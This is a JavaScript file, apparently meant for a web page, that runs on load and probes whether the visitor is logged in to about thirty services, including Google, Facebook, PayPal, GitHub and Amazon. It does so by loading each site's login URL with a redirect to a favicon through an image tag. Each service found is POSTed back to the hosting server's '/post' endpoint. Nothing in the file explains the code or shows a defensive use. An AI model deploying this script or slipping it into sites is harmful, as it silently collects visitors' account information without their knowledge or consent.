leakSocialMediaAccounts = function(callback) {
    var platforms = [{
        domain: "https://squareup.com",
        redirect: "/login?return_to=%2Ffavicon.ico",
        name: "Square"
    }, {
        domain: "https://twitter.com",
        redirect: "/login?redirect_after_login=%2Ffavicon.ico",
        name: "Twitter"
    }, {
        domain: "https://www.facebook.com",
        redirect: "/login.php?next=https%3A%2F%2Fwww.facebook.com%2Ffavicon.ico%3F_rdr%3Dp",
        name: "Facebook"
    }, {
        domain: "https://accounts.google.com",
        redirect: "/ServiceLogin?passive=true&continue=https%3A%2F%2Fwww.google.com%2Ffavicon.ico&uilel=3&hl=en&service=mail",
        name: "Gmail"
    }, {
        domain: "https://accounts.google.com",
        redirect: "/ServiceLogin?passive=true&continue=https%3A%2F%2Fwww.youtube.com%2Ffavicon.ico&uilel=3&hl=en&service=youtube",
        name: "Youtube"
    }, {
        domain: "https://plus.google.com",
        redirect: "/up/accounts/upgrade/?continue=https://plus.google.com/favicon.ico",
        name: "Google Plus"
    }, {
        domain: "https://login.skype.com",
        redirect: "/login?message=signin_continue&redirect_uri=https%3A%2F%2Fsecure.skype.com%2Ffavicon.ico",
        name: "Skype"
    }, {
        domain: "https://www.flickr.com",
        redirect: "/signin/yahoo/?redir=https%3A%2F%2Fwww.flickr.com/favicon.ico",
        name: "Flickr"
    }, {
        domain: "https://www.reddit.com",
        redirect: "/login?dest=https%3A%2F%2Fwww.reddit.com%2Ffavicon.ico",
        name: "Reddit"
    }, {
        domain: "https://www.tumblr.com",
        redirect: "/login?redirect_to=%2Ffavicon.ico",
        name: "Tumblr"
    }, {
        domain: "https://www.expedia.de",
        redirect: "/user/login?ckoflag=0&selc=0&uurl=qscr%3Dreds%26rurl%3D%252Ffavicon.ico",
        name: "Expedia"
    }, {
        domain: "https://www.dropbox.com",
        redirect: "/login?cont=https%3A%2F%2Fwww.dropbox.com%2Fstatic%2Fimages%2Fabout%2Fdropbox_logo_glyph_2015.svg",
        name: "Dropbox"
    }, {
        domain: "https://www.amazon.com",
        redirect: "/ap/signin/178-4417027-1316064?_encoding=UTF8&openid.assoc_handle=usflex&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.mode=checkid_setup&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&openid.ns.pape=http%3A%2F%2Fspecs.openid.net%2Fextensions%2Fpape%2F1.0&openid.pape.max_auth_age=10000000&openid.return_to=https%3A%2F%2Fwww.amazon.com%2Ffavicon.ico",
        name: "Amazon.com"
    }, {
        domain: "https://www.pinterest.com",
        redirect: "/login/?next=https%3A%2F%2Fwww.pinterest.com%2Ffavicon.ico",
        name: "Pinterest"
    }, {
        domain: "https://de.foursquare.com",
        redirect: "/login?continue=%2Ffavicon.ico",
        name: "Foursquare"
    }, {
        domain: "https://eu.battle.net",
        redirect: "/login/de/index?ref=http://eu.battle.net/favicon.ico",
        name: "Battle.net"
    }, {
        domain: "https://store.steampowered.com",
        redirect: "/login/?redir=favicon.ico",
        name: "Steam"
    }, {
        domain: "https://www.academia.edu",
        redirect: "/login?cp=/favicon.ico&cs=www",
        name: "Academia.edu"
    }, {
        domain: "https://accounts.google.com",
        redirect: "/ServiceLogin?service=blogger&hl=de&passive=1209600&continue=https://www.blogger.com/favicon.ico",
        name: "Blogger"
    }, {
        domain: "https://github.com",
        redirect: "/login?return_to=https%3A%2F%2Fgithub.com%2Ffavicon.ico%3Fid%3D1",
        name: "Github"
    }, {
        domain: "https://medium.com",
        redirect: "/m/signin?redirect=https%3A%2F%2Fmedium.com%2Ffavicon.ico&loginType=default",
        name: "Medium"
    }, {
        domain: "https://carbonmade.com",
        redirect: "/signin?returnTo=favicon.ico",
        name: "Carbonmade"
    }, {
        domain: "https://slack.com",
        redirect: "/checkcookie?redir=https%3A%2F%2Fslack.com%2Ffavicon.ico%23",
        name: "Slack"
    }, {
        domain: "https://www.paypal.com",
        redirect: "/signin?returnUri=https://t.paypal.com/ts?v=1.0.0",
        name: "Paypal"
    }, {
        domain: "https://500px.com",
        redirect: "/login?r=%2Ffavicon.ico",
        name: "500px"
    }, {
        domain: "https://www.airbnb.com",
        redirect: "/login?redirect_params[action]=favicon.ico&redirect_params[controller]=home",
        name: "Airbnb"
    }, {
        domain: "https://disqus.com",
        redirect: "/profile/login/?next=https%3A%2F%2Fdisqus.com%2Ffavicon.ico",
        name: "Disqus"
    }, {
        domain: "https://secure.meetup.com",
        redirect: "/login/?returnUri=https%3A%2F%2Fwww.meetup.com%2Fimg%2Fajax_loader_trans.gif",
        name: "Meetup"
    }, {
        domain: "https://bitbucket.org",
        redirect: "/account/signin/?next=/favicon.ico",
        name: "BitBucket"
    }, {
        domain: "https://secure.indeed.com",
        redirect: "/account/login?continue=%2ffavicon.ico",
        name: "Indeed"
    }, {
	domain: "https://hootsuite.com",
	redirect: "/dashboard",
	name: "hootsuite"
    }, {
        domain: "https://vk.com",
        redirect: "/login?u=2&to=ZmF2aWNvbi5pY28-",
        name: "VK"
    }];


var loggedin = [];
var loggedout = [];
var counter = platforms.length;
platforms.forEach(function(network) {

      counter--;

      var img = document.createElement('img');
      img.src = network.domain + network.redirect;

      img.onload = function() {
           callback(network, true);
  	   loggedin.push(network.name);

	   var xhr = new XMLHttpRequest();
           xhr.open("POST", '/post', true);
           xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
           	xhr.onreadystatechange = function() {
          		if(xhr.readyState == XMLHttpRequest.DONE && xhr.status == 200) {
          	  	}
          	 }
	        xhr.send("network" + "=" + network.name);

        };

      img.onerror = function() {
           callback(network, false);
	   loggedout.push(network.name);
        };

    });
};

var isFirstLoggedIn = true;
function displayResult(network, loggedIn) {
var id = loggedIn ? 'loggedIn' : 'notLoggedIn';
    if (loggedIn && isFirstLoggedIn) {
         isFirstLoggedIn = false;
    } else {
    }
}

leakSocialMediaAccounts(displayResult);
